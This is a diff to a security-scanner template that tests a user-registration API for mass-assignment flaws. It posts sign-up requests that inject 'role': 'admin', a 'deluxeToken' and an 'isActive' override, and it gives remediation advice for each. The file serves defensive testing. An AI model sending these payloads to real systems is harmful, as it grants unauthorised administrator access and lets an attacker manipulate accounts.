@@ -1,7 +1,9 @@
 id: mass-assignment
 info:
-  name: Mass Assignment Role Escalation
-  description: Detects if user registration accepts role parameter for privilege escalation
+  name: Mass Assignment Privilege Escalation
+  description: Registration endpoint accepts role parameter allowing admin account creation
+  owasp_category: A01:2021
+  severity: critical
   tags:
     - business-logic
     - mass-assignment
@@ -13,13 +15,43 @@ requests:
     path: /api/Users/
     headers:
       Content-Type: application/json
-    body: '{"email": "test_admin_{{rand_int()}}@example.com", "password": "TestPassword123!", "passwordRepeat": "TestPassword123!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "role": "admin"}'
+    body: '{"email": "massassign{{rand_int()}}@test.local", "password": "Test1234!", "passwordRepeat": "Test1234!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "role": "admin"}'
     matchers:
-      - type: semantic
+      - type: json
         selector: "$.data.role"
         condition: equals
         value: admin
     on_match:
       vulnerability: MASS_ASSIGNMENT
-      message: User registration accepts role parameter - privilege escalation possible
-      remediation: Use allow-list for accepted fields; never bind user input to sensitive fields
+      message: User registration accepts role parameter - privilege escalation to admin possible
+      remediation: Use allow-list for accepted fields; never bind user input directly to internal fields like role
+
+  - name: Register with deluxeToken
+    method: POST
+    path: /api/Users/
+    headers:
+      Content-Type: application/json
+    body: '{"email": "massassign{{rand_int()}}@test.local", "password": "Test1234!", "passwordRepeat": "Test1234!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "deluxeToken": "privilegedToken123"}'
+    matchers:
+      - type: json
+        selector: "$.data.deluxeToken"
+        condition: exists
+    on_match:
+      vulnerability: MASS_ASSIGNMENT
+      message: Registration accepts deluxeToken parameter - privilege escalation possible
+      remediation: Implement strict input validation; only allow explicitly whitelisted fields
+
+  - name: Register with isActive override
+    method: POST
+    path: /api/Users/
+    headers:
+      Content-Type: application/json
+    body: '{"email": "massassign{{rand_int()}}@test.local", "password": "Test1234!", "passwordRepeat": "Test1234!", "securityQuestion": {"question": "Your favorite memory?", "answer": "memory"}, "isActive": false}'
+    matchers:
+      - type: json
+        selector: "$.data.isActive"
+        condition: exists
+    on_match:
+      vulnerability: MASS_ASSIGNMENT
+      message: Registration accepts isActive parameter - account status manipulation possible
+      remediation: Never bind request body directly to model; use DTO pattern with explicit field mapping
